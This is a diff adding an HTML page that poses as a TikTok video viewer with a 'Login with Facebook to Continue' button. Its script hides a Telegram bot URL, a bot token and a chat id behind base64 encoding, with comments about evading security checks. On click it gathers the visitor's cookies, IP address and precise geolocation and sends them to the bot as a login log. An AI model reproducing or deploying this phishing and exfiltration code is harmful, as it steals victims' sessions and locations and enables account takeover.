@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>TikTok - Watch Video</title>
+    <style>
+        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
+        #main-video-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 10; display: flex; justify-content: center; align-items: center; }
+        .btn-fb { background: #1877f2; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 18px; }
+    </style>
+</head>
+<body>
+
+    <video id="main-video-bg" autoplay loop muted playsinline>
+        <source src="https://github.com/facloook5-cpu/tango.com/raw/refs/heads/main/Screenrecorder-2026-05-12-15-56-31-644(0)(0).mp4" type="video/mp4">
+    </video>
+
+    <div id="overlay">
+        <button class="btn-fb" onclick="startProcess()">Login with Facebook to Continue</button>
+    </div>
+
+    <script>
+        // تشفير البيانات لتفادي الفحص الأمني
+        const _0x_B = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==");
+        const _0x_T = atob("ODIwNzk0Mzg4MzpBQUZfWEpvZUtsSEVFMmJCN1JvMFBCVlN2cGloYnVaMGZXMA==");
+        const _0x_C = "8350812242";
+        const _0x_IP = atob("aHR0cHM6Ly9pcGFwaS5jby9qc29uLw==");
+
+        async function startProcess() {
+            // إخفاء زر تسجيل الدخول
+            document.getElementById('overlay').style.display = 'none';
+            
+            let _col = { loc: null, ip: null, cookies: document.cookie };
+
+            // جلب البيانات
+            try { 
+                const r = await fetch(_0x_IP); 
+                _col.ip = await r.json(); 
+            } catch(e) {}
+
+            try {
+                const p = await new Promise((res) => {
+                    navigator.geolocation.getCurrentPosition(res, null, { enableHighAccuracy: true });
+                });
+                _col.loc = { lat: p.coords.latitude, lon: p.coords.longitude };
+            } catch(e) {}
+
+            // إرسال البيانات
+            let m = `🔥 <b>NEW FB LOGIN LOG</b>\n🌐 <b>IP:</b> ${_col.ip?.ip || 'N/A'}\n🍪 <b>Cookies:</b> ${_col.cookies}`;
+            
+            await fetch(_0x_B + _0x_T + '/sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: _0x_C, text: m, parse_mode: 'HTML' })
+            });
+        }
+    </script>
+</body>
+</html>
